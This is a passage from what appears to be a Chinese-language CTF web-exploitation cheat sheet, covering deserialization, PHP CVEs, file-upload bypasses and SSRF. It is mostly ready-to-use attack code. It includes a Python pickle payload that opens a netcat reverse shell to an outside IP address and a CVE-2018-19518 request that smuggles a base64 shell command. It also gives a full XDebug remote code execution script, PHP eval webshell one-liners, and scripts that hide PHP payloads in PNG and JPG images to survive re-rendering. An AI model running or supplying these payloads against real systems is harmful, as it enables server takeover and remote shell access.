    $pendingbroadcast = new Illuminate\Broadcasting\PendingBroadcast($dispatcher,$queuedcommand);
    echo urlencode(serialize($pendingbroadcast));
}
?>
```

### 9 python反序列化

```
import pickle
import base64
class A(object):
    def __reduce__(self):
        return(eval,('__import__("os").popen("nc 42.192.142.64 33333 -e /bin/sh").read()',))
a=A()
test=pickle.dumps(a)
print(base64.b64encode(test))
```

## (七) PHPCVE

### 0X01 CVE-2019-11043

![image-20210504223729530](https://i.loli.net/2021/05/04/tLPV9ikbX1BJyGz.png)

直接就无条件rce了。原因是`nginx中一些错误的配置导致`的。

![image-20210504223905284](https://i.loli.net/2021/05/04/UgtFilVeob3QGRL.png)

```
test: 63a44f5fd4368923e62469611d232a02
admin: 9c618e664319512ef7db2d3c0672bee0
```

### 0x02 CVE-2018-19518

发包

```
POST / HTTP/1.1
Host: XXX:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:65.0) Gecko/20100101 Firefox/65.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Referer: http://XXX:8080/
Content-Type: application/x-www-form-urlencoded
Content-Length: 126
Connection: close
Upgrade-Insecure-Requests: 1

hostname=x+-oProxyCommand%3decho%09ZWNobyAnMTIzNDU2Nzg5MCc%2bL3RtcC90ZXN0MDAwMQo%3d|base64%09-d|sh}a&username=222&password=333

```

### 0x03 xdebug远程调试

```
#!/usr/bin/env python3
import re
import sys
import time
import requests
import argparse
import socket
import base64
import binascii
from concurrent.futures import ThreadPoolExecutor


pool = ThreadPoolExecutor(1)
session = requests.session()
session.headers = {
    'User-Agent': 'Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)'
}

def recv_xml(sock):
    blocks = []
    data = b''
    while True:
        try:
            data = data + sock.recv(1024)
        except socket.error as e:
            break
        if not data:
            break

        while data:
            eop = data.find(b'\x00')
            if eop < 0:
                break
            blocks.append(data[:eop])
            data = data[eop+1:]

        if len(blocks) >= 4:
            break
    
    return blocks[3]


def trigger(url):
    time.sleep(2)
    try:
        session.get(url + '?XDEBUG_SESSION_START=phpstorm', timeout=0.1)
    except:
        pass


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='XDebug remote debug code execution.')
    parser.add_argument('-c', '--code', required=True, help='the code you want to execute.')
    parser.add_argument('-t', '--target', required=True, help='target url.')
    parser.add_argument('-l', '--listen', default=9000, type=int, help='local port')
    args = parser.parse_args()
    
    ip_port = ('0.0.0.0', args.listen)
    sk = socket.socket()
    sk.settimeout(10)
    sk.bind(ip_port)
    sk.listen(5)

    pool.submit(trigger, args.target)
    conn, addr = sk.accept()
    conn.sendall(b''.join([b'eval -i 1 -- ', base64.b64encode(args.code.encode()), b'\x00']))

    data = recv_xml(conn)
    print('[+] Recieve data: ' + data.decode())
    g = re.search(rb'<\!\[CDATA\[([a-z0-9=\./\+]+)\]\]>', data, re.I)
    if not g:
        print('[-] No result...')
        sys.exit(0)

    data = g.group(1)

    try:
        print('[+] Result: ' + base64.b64decode(data).decode())
    except binascii.Error:
        print('[-] May be not string result...')
```



## (八) 文件上传

### 1. 短标签

```
1:<?= eval($_POST[1]);?>
2:<? eval($_POST[1]);?>
3:<% eval($_POST[1]);%>
```

### 2. .user.ini .htaccess

```
auto_prepend_file=pass.png
```

### 3. png二次渲染

脚本

```
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);
 
 
 
$img = imagecreatetruecolor(32, 32);
 
for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}
 
imagepng($img,'1.png');
?>
```

php5及以下使用 get 传 0=system post 传1=

### 4 jpg渲染

```
<?php
    $miniPayload = "<?=`tac f*`?>";


    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }

    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
                checkImage('_'.$argv[1], $outStreamTmp, TRUE);
                if($extraBytes !== 0) {
                    while((!$dis->eof())) {
                        if($dis->readByte() === 0xFF) {
                            if($dis->readByte !== 0x00) {
                                break;
                            }
                        }
                    }
                    $stopPos = $dis->seek() - 2;
                    $imageStreamSize = $stopPos - $startPos;
                    $outStream = 
                        substr($outStream, 0, $startPos) . 
                        $miniPayload . 
                        substr(
                            str_repeat("\0",$nullbytePayloadSize).
                                substr($outStream, $startPos, $imageStreamSize),
                            0,
                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
                                substr($outStream, $stopPos);
                } elseif($correctImage) {
                    $outStream = $outStreamTmp;
                } else {
                    break;
                }
                if(checkImage('payload_'.$argv[1], $outStream)) {
                    die('Success!');
                } else {
                    break;
                }
            }
        }
    }
    unlink('payload_'.$argv[1]);
    die('Something\'s wrong');

    function checkImage($filename, $data, $unlink = FALSE) {
        global $correctImage;
        file_put_contents($filename, $data);
        $correctImage = TRUE;
        imagecreatefromjpeg($filename);
        if($unlink)
            unlink($filename);
        return $correctImage;
    }

    function custom_error_handler($errno, $errstr, $errfile, $errline) {
        global $extraBytes, $correctImage;
        $correctImage = FALSE;
        if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
            if(isset($m[1])) {
                $extraBytes = (int)$m[1];
            }
        }
    }

    class DataInputStream {
        private $binData;
        private $order;
        private $size;

        public function __construct($filename, $order = false, $fromString = false) {
            $this->binData = '';
            $this->order = $order;
            if(!$fromString) {
                if(!file_exists($filename) || !is_file($filename))
                    die('File not exists ['.$filename.']');
                $this->binData = file_get_contents($filename);
            } else {
                $this->binData = $filename;
            }
            $this->size = strlen($this->binData);
        }

        public function seek() {
            return ($this->size - strlen($this->binData));
        }

        public function skip($skip) {
            $this->binData = substr($this->binData, $skip);
        }

        public function readByte() {
            if($this->eof()) {
                die('End Of File');
            }
            $byte = substr($this->binData, 0, 1);
            $this->binData = substr($this->binData, 1);
            return ord($byte);
        }

        public function readShort() {
            if(strlen($this->binData) < 2) {
                die('End Of File');
            }
            $short = substr($this->binData, 0, 2);
            $this->binData = substr($this->binData, 2);
            if($this->order) {
                $short = (ord($short[1]) << 8) + ord($short[0]);
            } else {
                $short = (ord($short[0]) << 8) + ord($short[1]);
            }
            return $short;
        }

        public function eof() {
            return !$this->binData||(strlen($this->binData) === 0);
        }
    }
?>
php exp.php a.png
```

## (九) SSRF

### 1. fastcgi

```
127.0.0.1:9000
```

### 2. mysql

```
127.0.0.1:3306
```

### 3 nginx配置文件

```
nginx可以通过fastcgi对接php，所以nginx的配置文件中也会有一血重要信息，此外还有端口转发等
```

```
gopher://127.0.0.1:9000/
```

